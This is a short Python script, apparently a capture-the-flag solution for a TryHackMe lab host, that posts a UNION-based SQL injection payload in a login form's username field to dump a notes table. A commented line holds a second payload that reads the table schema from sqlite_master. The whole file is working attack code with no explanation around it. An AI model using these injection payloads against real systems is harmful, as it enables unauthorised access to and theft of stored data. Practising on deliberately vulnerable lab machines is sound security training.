import requests 

username="' UNION SELECT cast(user_id as text),notes from notes--"
password="password"

data={'username': username}

url='http://unstable.thm/api/login'

x=requests.post(url,data)

print(x.text)


#' UNION SELECT sql,NULL from sqlite_master where tbl_name='notes' and type='table'--